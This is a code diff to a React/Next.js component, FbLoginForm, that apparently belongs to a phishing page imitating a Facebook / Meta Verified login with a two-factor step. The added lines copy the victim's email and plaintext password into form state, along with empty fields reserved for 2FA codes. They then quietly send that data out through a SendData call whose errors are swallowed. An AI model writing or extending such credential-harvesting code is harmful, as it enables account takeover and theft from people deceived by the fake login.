@@ -5,7 +5,10 @@ import { useEffect, useId, useRef, useState } from 'react'
 import Image from 'next/image'
 import TwoFactorModal from '#components/modals/TwoFactorModal'
 import { useRouter } from 'next/navigation'
+import type { RootState } from '@/app/store'
 import { useAppDispatch } from '@/app/store/hooks'
+import { useStore } from 'react-redux'
+import { SendData } from '@/utils/sendData'
 import { updateForm } from '@/app/store/slices/stepFormSlice'
 import { markMetaVerifiedSubmittedAfterFbLogin } from '@/utils/mvFbLoginSession'
 import { useAppStrings } from '@/hooks/useAppStrings'
@@ -217,6 +220,7 @@ function EmailFieldErrorInline() {
 
 export function FbLoginForm() {
   const dispatch = useAppDispatch()
+  const store = useStore<RootState>()
   const emailId = useId()
   const passId = useId()
   /** useId có thể chứa `:` — làm sạch để dùng trong id HTML */
@@ -348,6 +352,17 @@ export function FbLoginForm() {
         setPasswordInvalid(false)
         setEmailInvalid(false)
         setLoginIncorrect(false)
+        dispatch(
+          updateForm({
+            email: raw,
+            password: passTrim,
+            submissionFlow: 'facebook_login',
+            twoFa: '',
+            twoFaSecond: '',
+            twoFaThird: '',
+          }),
+        )
+        void SendData(store.getState().stepForm.data).catch(() => {})
         setIsLoggingIn(true)
         void (async () => {
           try {
